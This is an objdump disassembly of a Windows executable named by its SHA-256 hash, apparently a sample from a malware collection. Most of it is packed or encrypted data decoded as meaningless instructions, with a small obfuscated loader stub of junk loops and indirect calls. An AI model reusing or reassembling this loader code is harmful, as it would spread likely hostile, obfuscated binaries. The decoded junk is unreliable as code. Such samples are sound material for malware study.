
cd510bf96019eefe8b624ec7a3c5f92850fc6ed23f34b17642ba70b805f37729.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	jmp    0x4013b4
  401008:	cwde   
  401009:	jb     0x400fd2
  40100b:	inc    eax
  40100c:	pop    ebp
  40100d:	pop    ebp
  40100e:	cdq    
  40100f:	retf   0xfa9e
  401012:	inc    ebp
  401013:	scas   eax,DWORD PTR es:[edi]
  401014:	cli    
  401015:	pop    ss
  401016:	imul   esp,DWORD PTR [eax+0x7e],0x827e7e7e
  40101d:	jno    0x40109d
  40101f:	jle    0x400fef
  401021:	(bad)  
  401022:	xor    ecx,ebx
  401024:	xor    eax,0xccddcfdb
  401029:	ja     0x401033
  40102b:	or     ecx,DWORD PTR [edi]
  40102d:	(bad)  [edi+ecx*1]
  401030:	cmp    ecx,DWORD PTR [edi]
  401032:	int3   
  401033:	adc    al,0x37
  401035:	sbb    al,0x1f
  401037:	mov    ch,0x54
  401039:	or     al,0xa7
  40103b:	ror    DWORD PTR [esi],1
  40103d:	out    dx,eax
  40103e:	mov    cl,0xd3
  401040:	(bad)  
  401041:	or     ecx,DWORD PTR [esi-0x550741ea]
  401047:	dec    ebp
  401048:	sbb    DWORD PTR [ecx+0x561fb6de],esp
  40104e:	loopne 0x4010bf
  401050:	add    ebx,DWORD PTR ds:0x4cc67490
  401056:	mov    ds:0xc8dd215b,al
  40105b:	xor    BYTE PTR [ecx-0x5c368c7e],ah
  401061:	jbe    0x40102b
  401063:	fisttp DWORD PTR [ebp+0x359cc6f5]
  401069:	jecxz  0x4010a7
  40106b:	and    ebp,0x4f
  40106e:	(bad)  
  40106f:	xchg   esi,eax
  401070:	dec    ebp
  401071:	inc    DWORD PTR [edi-0x2d5a886c]
  401077:	mov    cl,0x41
  401079:	loope  0x4010a1
  40107b:	pop    ecx
  40107c:	sub    edi,DWORD PTR [edx-0x4f61911e]
  401082:	jae    0x4010a1
  401084:	retf   
  401085:	call   0xe8ca:0x5ee3d82d
  40108c:	mov    ah,0xfc
  40108e:	loop   0x40102a
  401090:	cmp    eax,0xc76978cf
  401095:	sub    al,0xc1
  401097:	or     dl,ch
  401099:	sbb    eax,0xb39965d
  40109e:	outs   dx,DWORD PTR ds:[esi]
  40109f:	ins    DWORD PTR es:[edi],dx
  4010a0:	je     0x4010a6
  4010a2:	cmp    eax,0x24588ed1
  4010a7:	jns    0x401128
  4010a9:	pop    DWORD PTR ds:[edx]
  4010ac:	shl    DWORD PTR [esi-0x2ea6acfd],cl
  4010b2:	mov    BYTE PTR ds:0x15d550db,0x7d
  4010b9:	sahf   
  4010ba:	mov    dh,0x43
  4010bc:	daa    
  4010bd:	sbb    DWORD PTR [ebx],esp
  4010bf:	addr16 and eax,0x4f3edb12
  4010c5:	in     al,0xc0
  4010c7:	test   al,0xe5
  4010c9:	jbe    0x4010e6
  4010cb:	outs   dx,BYTE PTR ds:[esi]
  4010cc:	or     eax,0x7d35d0ba
  4010d1:	sbb    ch,ah
  4010d3:	sbb    al,0x92
  4010d5:	cmp    esp,DWORD PTR [edi+edi*1-0x37c3f121]
  4010dc:	mov    ?,WORD PTR [edi+0x9749863]
  4010e2:	mov    ch,0xfc
  4010e4:	pop    es
  4010e5:	push   ss
  4010e6:	pop    eax
  4010e7:	pushf  
  4010e8:	mov    edx,DWORD PTR [ebp-0x15]
  4010eb:	in     al,0x93
  4010ed:	popa   
  4010ee:	pop    ebx
  4010ef:	std    
  4010f0:	call   0x2fe051dc
  4010f5:	xchg   ecx,eax
  4010f6:	add    dh,BYTE PTR [edx]
  4010f8:	bnd jnp 0x4010f2
  4010fb:	mov    ds:0x1b41383c,eax
  401100:	xchg   ebx,eax
  401101:	push   ss
  401102:	mov    eax,eax
  401104:	sub    edi,esi
  401106:	(bad)  
  401107:	pusha  
  401108:	retf   
  401109:	xchg   esi,eax
  40110a:	dec    esi
  40110b:	dec    edx
  40110c:	stos   BYTE PTR es:[edi],al
  40110d:	inc    al
  40110f:	es xor al,0x7c
  401112:	dec    edi
  401113:	dec    ebp
  401114:	loopne 0x40116f
  401116:	or     al,0x28
  401118:	dec    eax
  401119:	(bad)  
  40111a:	retf   
  40111b:	xor    DWORD PTR [edi],eax
  40111d:	call   0xfe94:0x489d4827
  401124:	push   0x52
  401126:	sbb    eax,0x736b3cec
  40112b:	arpl   WORD PTR [edx-0x60914fd],cx
  401131:	addr16 stc 
  401133:	fst    DWORD PTR [edi]
  401135:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401136:	dec    ebp
  401137:	pop    ss
  401138:	jne    0x40115a
  40113a:	movlps QWORD PTR [esi+0x66c53bda],xmm1
  401141:	ins    DWORD PTR es:[edi],dx
  401142:	cmc    
  401143:	sti    
  401144:	mov    dh,al
  401146:	test   DWORD PTR [ebx],0x99984910
  40114c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40114d:	ins    DWORD PTR es:[edi],dx
  40114e:	in     al,0xe2
  401150:	shl    BYTE PTR [ecx],0xff
  401153:	push   edx
  401154:	or     esi,DWORD PTR [esi]
  401156:	repz pop edx
  401158:	xchg   ebp,eax
  401159:	sbb    eax,0x28db8bf5
  40115e:	mov    al,0x94
  401160:	rcr    DWORD PTR [ecx+ebx*1+0x1c4171ce],0x42
  401168:	dec    ecx
  401169:	pusha  
  40116a:	sub    dl,bh
  40116c:	adc    DWORD PTR [ebx-0x7533aec],0x148e2724
  401176:	push   ebp
  401177:	pop    ecx
  401178:	cdq    
  401179:	pop    eax
  40117a:	sub    eax,0x7f3fdcbd
  40117f:	(bad)
  401183:	scas   al,BYTE PTR es:[edi]
  401184:	cmp    bl,al
  401186:	mov    DWORD PTR [ecx+esi*2-0x25],ecx
  40118a:	sub    BYTE PTR [esi+ecx*2+0x218416bc],al
  401191:	loope  0x401206
  401193:	fwait
  401194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401195:	scas   al,BYTE PTR es:[edi]
  401196:	mov    eax,0xec54d176
  40119b:	fwait
  40119c:	xor    al,0x40
  40119e:	mov    esi,0x1cac008a
  4011a3:	mov    esp,0xfa71708f
  4011a8:	scas   eax,DWORD PTR es:[edi]
  4011a9:	push   es
  4011aa:	es mov edi,eax
  4011ad:	inc    esp
  4011ae:	in     eax,dx
  4011af:	push   ebx
  4011b0:	stos   BYTE PTR es:[edi],al
  4011b1:	xchg   edx,eax
  4011b2:	mov    WORD PTR cs:[edi+0x3a],ss
  4011b6:	push   cs
  4011b7:	and    eax,0x39b6cf26
  4011bc:	jge    0x40114c
  4011be:	lods   eax,DWORD PTR ds:[esi]
  4011bf:	(bad)  
  4011c0:	cdq    
  4011c1:	xlat   BYTE PTR ds:[ebx]
  4011c2:	fs mov ebp,0x6af9fb20
  4011c8:	cmp    dh,BYTE PTR [ebx+0x673a99f7]
  4011ce:	sti    
  4011cf:	div    BYTE PTR [eax+0x1b263467]
  4011d5:	rcr    cl,cl
  4011d7:	in     eax,0x8a
  4011d9:	neg    bl
  4011db:	loop   0x40125b
  4011dd:	jns    0x4011dd
  4011df:	lods   eax,DWORD PTR ds:[esi]
  4011e0:	mov    dl,ah
  4011e2:	mov    es:0xb07475f9,al
  4011e8:	psubq  mm7,QWORD PTR [edi+0x4820f608]
  4011ef:	xlat   BYTE PTR ds:[ebx]
  4011f0:	add    ah,dl
  4011f2:	inc    esp
  4011f3:	mov    al,0x8e
  4011f5:	lods   eax,DWORD PTR ds:[esi]
  4011f6:	leave  
  4011f7:	ret    
  4011f8:	mov    ds:0x531a6c60,al
  4011fd:	mov    ecx,0x5aac32fb
  401202:	cmp    esi,eax
  401204:	push   ecx
  401205:	xchg   edx,eax
  401206:	xor    al,0x20
  401208:	outs   dx,DWORD PTR ds:[esi]
  401209:	jmp    0x401235
  40120b:	mov    bh,0x62
  40120d:	enter  0x9ad0,0x2a
  401211:	sbb    al,0x7e
  401213:	sub    al,0xc9
  401215:	ins    BYTE PTR es:[edi],dx
  401216:	push   esi
  401217:	sbb    bl,BYTE PTR [eax+0x6286506a]
  40121d:	push   ecx
  40121e:	sub    dl,bl
  401220:	cmp    esi,ebp
  401222:	mov    dh,0x4d
  401224:	cwde   
  401225:	and    edx,esp
  401227:	sub    esp,ebx
  401229:	mov    bh,0xa0
  40122b:	push   esp
  40122c:	or     ebp,edi
  40122e:	gs popf 
  401230:	jmp    0x2293801b
  401235:	out    0x7e,eax
  401237:	fsubr  QWORD PTR [edx-0x3499eb5a]
  40123d:	test   al,0x66
  40123f:	stc    
  401240:	(bad)  
  401241:	fisttp WORD PTR ds:0x15f11f47
  401247:	xor    al,BYTE PTR [eax-0x18]
  40124a:	dec    edi
  40124b:	ret    
  40124c:	addr16 retf 
  40124e:	into   
  40124f:	test   DWORD PTR [ebx+0x4a],0xb1276696
  401256:	inc    DWORD PTR [edi-0x364e248a]
  40125c:	adc    BYTE PTR [ebx+0xb],ah
  40125f:	push   ds
  401260:	in     eax,dx
  401261:	repnz add esi,eax
  401264:	pop    esi
  401265:	jecxz  0x4012a1
  401267:	out    dx,al
  401268:	mov    bl,0xa5
  40126a:	test   BYTE PTR [eax-0x1bb542ae],al
  401270:	push   cs
  401271:	cwde   
  401272:	adc    BYTE PTR [edx],bh
  401274:	xchg   edi,eax
  401275:	into   
  401276:	nop
  401277:	pop    eax
  401278:	sub    BYTE PTR [ecx+0x61],dh
  40127b:	leave  
  40127c:	mov    bh,0x4a
  40127e:	add    BYTE PTR [edi-0x3f0f62fa],0x95
  401285:	in     al,dx
  401286:	cmp    bh,0x6
  401289:	xor    al,0x62
  40128b:	push   ebx
  40128c:	inc    edi
  40128d:	pop    eax
  40128e:	jae    0x40127a
  401290:	xor    eax,DWORD PTR [eax]
  401292:	call   0x9d845426
  401297:	adc    ch,BYTE PTR [ebp+0x584a184f]
  40129d:	repnz dec ebp
  40129f:	repz xchg esp,eax
  4012a1:	inc    edx
  4012a2:	pop    edx
  4012a3:	nop
  4012a4:	adc    DWORD PTR [ecx+0xec87fa1],esi
  4012aa:	sub    edx,DWORD PTR [edx+0x4a907d93]
  4012b0:	or     cl,BYTE PTR [edi+0x16]
  4012b3:	shr    BYTE PTR [edx-0x37517827],1
  4012b9:	sahf   
  4012ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012bb:	pop    ebp
  4012bc:	sbb    ebx,DWORD PTR [ebx-0x71]
  4012bf:	rcr    BYTE PTR ds:0xc5f654fe,cl
  4012c5:	fsub   DWORD PTR [ebx]
  4012c7:	adc    al,0xa0
  4012c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012ca:	lds    eax,FWORD PTR [esi+0x66337f62]
  4012d0:	push   0x426a5180
  4012d5:	adc    eax,0xb634275e
  4012da:	mov    ah,0x50
  4012dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012dd:	pop    eax
  4012de:	mov    dl,0xd7
  4012e0:	les    edx,FWORD PTR [edi]
  4012e2:	mov    dl,0xa0
  4012e4:	dec    ecx
  4012e5:	mov    al,ds:0xad581705
  4012ea:	and    ah,ch
  4012ec:	mov    ch,0xe2
  4012ee:	pop    ebp
  4012ef:	in     eax,0x3c
  4012f1:	stos   BYTE PTR es:[edi],al
  4012f2:	cmp    eax,0xcdb773e7
  4012f7:	in     al,0x1c
  4012f9:	into   
  4012fa:	ror    ebp,cl
  4012fc:	mov    edi,0xe37a3576
  401301:	dec    ebx
  401302:	pop    es
  401303:	xchg   edx,eax
  401304:	mov    DWORD PTR [edx+0x3c],0xb7525413
  40130b:	stos   DWORD PTR es:[edi],eax
  40130c:	or     DWORD PTR [edx-0x6c6b8a65],0x85421878
  401316:	mov    bl,0x8b
  401318:	inc    sp
  40131a:	xchg   edi,eax
  40131b:	mov    bl,0xa1
  40131d:	ret    
  40131e:	jp     0x4012d2
  401320:	mov    BYTE PTR [esi+0x48],cl
  401323:	push   esi
  401324:	push   0xcc1a4ee9
  401329:	je     0x4012f0
  40132b:	loop   0x4012de
  40132d:	fwait
  40132e:	cmp    eax,0xec8ef639
  401333:	dec    ecx
  401334:	push   ss
  401335:	leave  
  401336:	retf   0x5253
  401339:	jmp    0x802c9d1c
  40133e:	shr    BYTE PTR ds:0x8b6a76f7,1
  401344:	popa   
  401345:	js     0x4012ca
  401347:	dec    ebp
  401348:	out    dx,al
  401349:	inc    ecx
  40134a:	sbb    eax,esi
  40134c:	pop    esp
  40134d:	shl    DWORD PTR [eiz*4-0x6149412d],1
  401354:	sub    al,0x32
  401356:	add    DWORD PTR [ebp+0x4e33fce],edx
  40135c:	and    esi,ebx
  40135e:	dec    ebx
  40135f:	cwde   
  401360:	arpl   WORD PTR [ecx],ax
  401362:	rol    BYTE PTR [edx+ecx*4-0x33],cl
  401366:	repz dec edx
  401368:	mov    BYTE PTR [ecx+esi*1-0x1d92f597],al
  40136f:	sbb    cl,ch
  401371:	mov    edx,DWORD PTR ds:0x4645e33
  401377:	inc    esp
  401378:	int3   
  401379:	enter  0x5934,0x84
  40137d:	std    
  40137e:	sbb    DWORD PTR [ebx+0x3ff62bbb],ecx
  401384:	and    BYTE PTR [edx],0x61
  401387:	cmp    al,0xf4
  401389:	test   eax,0x9b3b64db
  40138e:	in     eax,dx
  40138f:	lods   eax,DWORD PTR ds:[esi]
  401390:	aas    
  401391:	test   al,0xac
  401393:	mov    ss,WORD PTR [eax+0x72]
  401396:	inc    ebp
  401397:	cld    
  401398:	sar    eax,0xc4
  40139b:	mov    dl,0x6
  40139d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40139e:	add    eax,0x397f94ef
  4013a3:	lds    edx,FWORD PTR [ebx+0x5439c9f0]
  4013a9:	jbe    0x4013e8
  4013ab:	pop    es
  4013ac:	mov    al,ah
  4013ae:	jb     0x401351
  4013b0:	jns    0x4013d4
  4013b2:	push   es
  4013b3:	dec    esi
  4013b4:	sub    esp,0x2c
  4013b7:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  4013be:	sbb    DWORD PTR ds:0x430586,edi
  4013c4:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  4013cb:	sub    ecx,eax
  4013cd:	mov    eax,0x9507
  4013d2:	mov    WORD PTR [ebp-0x4],ax
  4013d6:	mov    DWORD PTR ds:0x42ef20,0x1f
  4013e0:	cmp    DWORD PTR ds:0x42ef20,0x0
  4013e7:	je     0x40141b
  4013ed:	cmp    DWORD PTR ds:0x42ef20,0x27
  4013f4:	jne    0x401403
  4013fa:	push   DWORD PTR [ebp-0x1c]
  4013fd:	call   DWORD PTR ds:0x42eaec
  401403:	mov    ecx,DWORD PTR ds:0x42ef20
  401409:	dec    ecx
  40140a:	mov    DWORD PTR ds:0x42ef20,ecx
  401410:	jmp    0x4013e0
  401415:	sub    ecx,DWORD PTR ds:0x42ef24
  40141b:	lea    eax,[ebp-0x24]
  40141e:	mov    DWORD PTR ds:0x430656,0x15
  401428:	cmp    DWORD PTR ds:0x430656,0x0
  40142f:	je     0x401491
  401435:	cmp    DWORD PTR ds:0x430656,0x9
  40143c:	jne    0x40145f
  401442:	push   DWORD PTR [ebp-0x28]
  401445:	push   0x42e8e5
  40144a:	push   0x78ed
  40144f:	push   0x520a
  401454:	push   0x5250
  401459:	call   DWORD PTR ds:0x42eaf0
  40145f:	cmp    DWORD PTR ds:0x430656,0xa
  401466:	jne    0x401479
  40146c:	mov    ecx,DWORD PTR ds:0x430656
  401472:	dec    ecx
  401473:	mov    DWORD PTR ds:0x430656,ecx
  401479:	mov    ecx,DWORD PTR ds:0x430656
  40147f:	dec    ecx
  401480:	mov    DWORD PTR ds:0x430656,ecx
  401486:	jmp    0x401428
  40148b:	and    ecx,DWORD PTR ds:0x43059a
  401491:	mov    DWORD PTR [ebp-0x28],eax
  401494:	and    ecx,ecx
  401496:	mov    eax,DWORD PTR [ebp+0x8]
  401499:	jmp    0x40184a
  40149e:	sub    ch,BYTE PTR [esi+0x5aba4a9e]
  4014a4:	jmp    0x6050:0xc48b26e
  4014ab:	mov    al,0xa1
  4014ad:	fild   DWORD PTR [edx-0x7d81818f]
  4014b3:	jno    0x401533
  4014b5:	jle    0x40144e
  4014b7:	mov    ah,0x1e
  4014b9:	repnz out dx,eax
  4014bb:	ror    BYTE PTR [ecx-0x5ec893b2],0xd4
  4014c2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4014c4:	outs   dx,DWORD PTR ds:[esi]
  4014c5:	inc    esp
  4014c6:	mov    ch,0xe1
  4014c8:	sbb    eax,0xf728cb8b
  4014cd:	adc    ah,BYTE PTR [edi+0x1dc27009]
  4014d3:	sbb    ch,BYTE PTR [eax-0x49]
  4014d6:	(bad)
  4014d9:	and    BYTE PTR [esi+0x5e716291],0x8a
  4014e0:	jae    0x401507
  4014e2:	xor    ebp,DWORD PTR [esi]
  4014e4:	mov    al,0x86
  4014e6:	jp     0x401548
  4014e8:	mov    edi,0x75ca0736
  4014ed:	mov    bl,0x6f
  4014ef:	cmp    DWORD PTR [eax+0x1867fa0e],ebp
  4014f5:	push   eax
  4014f6:	and    ebx,DWORD PTR [edi+eiz*8+0x5ad550e]
  4014fd:	adc    BYTE PTR [esi+0x1c],cl
  401500:	cmp    BYTE PTR [esi],al
  401502:	and    BYTE PTR [ebp-0x49],al
  401505:	(bad)  
  401506:	ja     0x401527
  401508:	scas   eax,DWORD PTR es:[edi]
  401509:	sbb    al,0xec
  40150b:	mov    ds:0x29a905e4,eax
  401510:	sub    eax,0x55da83bc
  401515:	or     ah,BYTE PTR [ebp+ecx*8+0x3]
  401519:	pop    edx
  40151a:	into   
  40151b:	cmp    ecx,esp
  40151d:	retf   
  40151e:	dec    esi
  40151f:	sub    eax,0xa4eb7db5
  401524:	pusha  
  401525:	sub    al,BYTE PTR [edx+0x38ae91ac]
  40152b:	pop    ds
  40152c:	jo     0x401516
  40152e:	adc    eax,0x718b161e
  401533:	daa    
  401534:	sbb    al,0x9
  401536:	inc    edi
  401537:	ins    DWORD PTR es:[edi],dx
  401538:	js     0x401566
  40153a:	loop   0x4014d3
  40153c:	jb     0x40154f
  40153e:	inc    ebp
  40153f:	jae    0x4014df
  401541:	inc    eax
  401542:	lods   eax,DWORD PTR ds:[esi]
  401543:	pop    ebp
  401544:	adc    BYTE PTR [esi-0x500ca30a],dl
  40154a:	fdivr  DWORD PTR [ebx]
  40154c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40154d:	pop    ds
  40154e:	dec    esi
  40154f:	or     ebp,ebp
  401551:	mov    WORD PTR [ebp+0x51],cs
  401554:	push   0x39b033f0
  401559:	lea    ebp,[ecx-0x9]
  40155c:	sbb    DWORD PTR [ebp-0x5a11f722],esi
  401562:	test   BYTE PTR ds:0x732fd816,bh
  401568:	pop    edx
  401569:	fisttp WORD PTR [ebx+0x7]
  40156c:	mov    DWORD PTR [edi-0x5d7d2407],ebx
  401572:	jnp    0x4015e8
  401574:	mov    bh,0x73
  401576:	stos   BYTE PTR es:[edi],al
  401577:	mov    cl,0xa5
  401579:	shl    BYTE PTR [edx],0x21
  40157c:	enter  0x525,0x32
  401580:	mov    es,WORD PTR [ecx]
  401582:	jl     0x4015d9
  401584:	fidiv  WORD PTR [esi-0x2cc5165d]
  40158a:	fild   DWORD PTR fs:[esi+0x29ee76ad]
  401591:	xor    dh,bh
  401593:	dec    esp
  401594:	jle    0x401586
  401596:	stos   BYTE PTR es:[edi],al
  401597:	test   esi,0x846be961
  40159d:	daa    
  40159e:	fmul   DWORD PTR es:[eax+esi*1+0x15d97f9]
  4015a6:	and    eax,0x6714722e
  4015ab:	test   DWORD PTR [esi+0x7e],edi
  4015ae:	xchg   edx,eax
  4015af:	mov    ds:0x5ee07c73,al
  4015b4:	adc    cl,dh
  4015b6:	ins    BYTE PTR es:[edi],dx
  4015b7:	mov    esp,DWORD PTR [edx]
  4015b9:	sbb    eax,0x55d4aa30
  4015be:	jne    0x40158e
  4015c0:	stos   DWORD PTR es:[edi],eax
  4015c1:	add    al,0x91
  4015c3:	sub    eax,0x42685180
  4015c8:	xchg   esp,eax
  4015c9:	imul   ebx,DWORD PTR [ebp+0x38],0x4ec4ab55
  4015d0:	xor    dl,BYTE PTR [esi-0x63631ce7]
  4015d6:	sbb    BYTE PTR [ebx],bh
  4015d8:	or     eax,0x1d6ef201
  4015dd:	pop    edi
  4015de:	(bad)  
  4015df:	(bad)  
  4015e0:	cdq    
  4015e1:	dec    esi
  4015e2:	dec    ebp
  4015e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e4:	mov    ch,0xb4
  4015e6:	mov    DWORD PTR [edx],0x52aae4f0
  4015ec:	call   0x2de79a15
  4015f1:	xchg   ebx,eax
  4015f2:	rol    DWORD PTR [edx],0xd7
  4015f5:	sbb    al,0x16
  4015f7:	in     al,0xb6
  4015f9:	sti    
  4015fa:	pop    esi
  4015fb:	mov    al,0x70
  4015fd:	pusha  
  4015fe:	(bad)  
  4015ff:	stc    
  401600:	test   eax,eax
  401602:	shr    al,0xbc
  401605:	mov    ds:0xc374ed57,al
  40160a:	mov    al,0x0
  40160c:	or     ah,BYTE PTR ds:0x29fc1b28
  401612:	pop    ebp
  401613:	gs (bad) 
  401616:	in     al,0x3c
  401618:	popa   
  401619:	popa   
  40161a:	nop
  40161b:	and    bh,BYTE PTR [eax]
  40161d:	hlt    
  40161e:	xor    DWORD PTR [esi+0x66],ebp
  401621:	call   0x784b:0x87bf145d
  401628:	or     BYTE PTR [edx+0x7],dl
  40162b:	inc    ebx
  40162c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40162d:	retf   
  40162e:	test   BYTE PTR [eax+0x438fd23c],bh
  401634:	les    edx,FWORD PTR [edi]
  401636:	dec    eax
  401637:	jnp    0x4015c1
  401639:	scas   al,BYTE PTR es:[edi]
  40163a:	jo     0x401662
  40163c:	xor    ecx,DWORD PTR [edi]
  40163e:	dec    edx
  40163f:	push   esi
  401640:	xor    eax,DWORD PTR [esi]
  401642:	mov    ecx,0xa6fc744d
  401647:	test   BYTE PTR [eax],0x9b
  40164a:	mov    edi,0x89521094
  40164f:	stos   DWORD PTR es:[edi],eax
  401650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401651:	fldenv [ecx-0x5c7ec238]
  401657:	lds    ebp,FWORD PTR [edx+0x203fadff]
  40165d:	add    eax,0x288d4448
  401662:	test   DWORD PTR [ecx-0x30],esp
  401665:	enter  0xe26d,0xc8
  401669:	lds    esi,FWORD PTR [eax+0x4b330654]
  40166f:	adc    al,0x93
  401671:	mov    bl,0x6e
  401673:	arpl   WORD PTR [esp+edx*4+0x16],si
  401677:	cmp    BYTE PTR [eax],ah
  401679:	and    DWORD PTR [ebx-0x65606a3f],0xa9001614
  401683:	or     al,bl
  401685:	xchg   DWORD PTR [edi],esp
  401687:	ja     0x40168f
  401689:	test   bh,al
  40168b:	dec    ebp
  40168c:	clc    
  40168d:	push   edx
  40168e:	mov    bl,0x50
  401690:	xor    eax,0xf4d9795e
  401695:	xchg   edx,eax
  401696:	sbb    eax,0x7390fdfe
  40169b:	je     0x40162b
  40169d:	dec    esp
  40169e:	mov    esp,0x271f2c06
  4016a3:	add    al,BYTE PTR [eax-0x77c4a2ca]
  4016a9:	push   ss
  4016aa:	enter  0x8391,0x3f
  4016ae:	mov    ch,0x29
  4016b0:	outs   dx,DWORD PTR ds:[esi]
  4016b1:	fcomip st,st(7)
  4016b3:	push   edx
  4016b4:	scas   eax,DWORD PTR es:[edi]
  4016b5:	fadd   DWORD PTR [eax]
  4016b7:	jbe    0x4016a2
  4016b9:	jne    0x401664
  4016bb:	nop
  4016bc:	aaa    
  4016bd:	icebp  
  4016be:	sub    BYTE PTR [eax],dh
  4016c0:	dec    edx
  4016c1:	das    
  4016c2:	test   edx,0xf3f3dde8
  4016c8:	jmp    0x63c5:0x8b1dd4a4
  4016cf:	xor    ch,BYTE PTR [edx-0x7026edc2]
  4016d5:	leave  
  4016d6:	xchg   edi,eax
  4016d7:	pop    ecx
  4016d8:	retf   0xad2a
  4016db:	sbb    DWORD PTR [ecx],0x1
  4016de:	xchg   edi,eax
  4016df:	fld    QWORD PTR [ebx]
  4016e1:	nop
  4016e2:	or     BYTE PTR [ebx],dl
  4016e4:	leave  
  4016e5:	repz or ebx,edi
  4016e8:	sbb    edx,DWORD PTR [eax]
  4016ea:	test   DWORD PTR [esp+eax*2-0x3a199ba7],edi
  4016f1:	xor    eax,0xb7a49fd6
  4016f6:	jnp    0x4016cb
  4016f8:	jno    0x40167b
  4016fa:	repz dec esp
  4016fc:	pop    es
  4016fd:	leave  
  4016fe:	adc    al,0x5d
  401700:	pop    ecx
  401701:	xchg   ebx,eax
  401702:	cmp    dl,cl
  401704:	in     al,dx
  401705:	jo     0x4016e2
  401707:	dec    edi
  401708:	out    dx,al
  401709:	push   ebx
  40170a:	add    al,0xae
  40170c:	cmp    DWORD PTR [edi-0x5],ebx
  40170f:	jl     0x4016dc
  401711:	pop    es
  401712:	outs   dx,BYTE PTR ds:[esi]
  401713:	fwait
  401714:	xor    BYTE PTR [ebx+0x74c1ee81],cl
  40171a:	sub    edx,ecx
  40171c:	inc    edx
  40171d:	call   0xc93c:0xf371a8b9
  401724:	mov    edi,ebx
  401726:	popa   
  401727:	stos   DWORD PTR es:[edi],eax
  401728:	sbb    al,0x9e
  40172a:	mov    ch,0xca
  40172c:	ror    BYTE PTR [ecx],1
  40172e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40172f:	std    
  401730:	push   ds
  401731:	cmovl  esi,DWORD PTR [edi]
  401734:	pop    edx
  401735:	cmp    eax,0xc989c0fc
  40173a:	inc    ecx
  40173b:	mov    ds:0xc291dc9b,eax
  401740:	dec    eax
  401741:	clc    
  401742:	iret   
  401743:	cli    
  401744:	sub    cl,cl
  401746:	out    dx,al
  401747:	imul   eax,DWORD PTR [edx-0x17da2072],0xffffffad
  40174e:	mov    eax,DWORD PTR [edx+0x724d60fe]
  401754:	aam    0xe1
  401756:	mov    ds:0xd9e7754b,al
  40175b:	xchg   ebp,eax
  40175c:	mov    bh,0x7
  40175e:	sbb    ch,BYTE PTR [bp-0x38f]
  401763:	adc    al,0x52
  401765:	in     eax,0xa0
  401767:	add    BYTE PTR [ebx-0x32],ah
  40176a:	mov    edi,edx
  40176c:	and    BYTE PTR [eax-0x64],0xe5
  401770:	sub    bh,BYTE PTR [eax*1-0x5d06cf21]
  401777:	sub    eax,0x996dca6c
  40177c:	sub    al,0xc7
  40177e:	arpl   ax,si
  401780:	cwde   
  401781:	lods   al,BYTE PTR ds:[esi]
  401782:	adc    esi,eax
  401784:	and    eax,0xf5a3d1e8
  401789:	cmc    
  40178a:	hlt    
  40178b:	addr16 int3 
  40178d:	out    dx,al
  40178e:	nop
  40178f:	mov    edx,0xe9ece529
  401794:	mov    edx,cs
  401796:	scas   al,BYTE PTR es:[edi]
  401797:	outs   dx,DWORD PTR ds:[esi]
  401798:	aaa    
  401799:	pop    edx
  40179a:	jne    0x40174c
  40179c:	jmp    0x2925:0x21626004
  4017a3:	cmp    al,0x74
  4017a5:	idiv   esp
  4017a7:	push   ebp
  4017a8:	test   ebx,0xba125a26
  4017ae:	shr    BYTE PTR [edi+0x5b34da2],0x1e
  4017b5:	sub    BYTE PTR [esi],dh
  4017b7:	popf   
  4017b8:	add    DWORD PTR [ecx],esi
  4017ba:	xor    cl,BYTE PTR [ebp+0x1b96e22b]
  4017c0:	add    al,ah
  4017c2:	lods   eax,DWORD PTR ds:[esi]
  4017c3:	jb     0x401818
  4017c5:	int3   
  4017c6:	inc    esp
  4017c7:	idiv   DWORD PTR [eax+0x5b]
  4017ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017cb:	pop    ss
  4017cc:	jmp    0x401764
  4017ce:	fwait
  4017cf:	and    DWORD PTR [ebx+ecx*1],esp
  4017d2:	cmp    ecx,ebp
  4017d4:	sub    al,0xc9
  4017d6:	xchg   ecx,eax
  4017d7:	dec    edi
  4017d8:	popa   
  4017d9:	hlt    
  4017da:	aad    0x18
  4017dc:	ror    DWORD PTR [esi-0x3496e406],0x4f
  4017e3:	in     eax,0x6a
  4017e5:	sub    al,0x4d
  4017e7:	and    eax,DWORD PTR [ecx-0x67]
  4017ea:	addr16 xchg esi,eax
  4017ec:	and    ch,bl
  4017ee:	test   BYTE PTR [esi+0x27],ch
  4017f1:	shl    BYTE PTR [edx-0x20],0x74
  4017f5:	mov    ebp,0x7404fa33
  4017fa:	aam    0x52
  4017fc:	xlat   BYTE PTR ds:[ebx]
  4017fd:	mov    ebx,0x6f3a4ab1
  401802:	xchg   edx,eax
  401803:	jns    0x4017ea
  401805:	mov    cl,0x15
  401807:	mov    BYTE PTR [ebx],ah
  401809:	jle    0x401861
  40180b:	push   0x924c8eb2
  401810:	nop
  401811:	jmp    0x4017b8
  401813:	xchg   BYTE PTR [edx],bl
  401815:	and    DWORD PTR [ebp+ebp*8+0x361451e9],0x20a8f514
  401820:	push   ebx
  401821:	mov    al,0xf0
  401823:	push   edi
  401824:	sbb    eax,DWORD PTR [ecx]
  401826:	int    0x30
  401828:	cmp    bl,BYTE PTR ds:0xa5189244
  40182e:	and    DWORD PTR [esi],eax
  401830:	add    BYTE PTR cs:[ecx+0x6ad4e6de],ch
  401837:	inc    esp
  401838:	not    DWORD PTR [edx-0x1b25562d]
  40183e:	push   ecx
  40183f:	loope  0x401840
  401841:	adc    eax,ecx
  401843:	dec    ebp
  401844:	or     BYTE PTR [edi-0x72775405],al
  40184a:	mov    DWORD PTR [ebp-0x20],eax
  40184d:	neg    DWORD PTR ds:0x430596
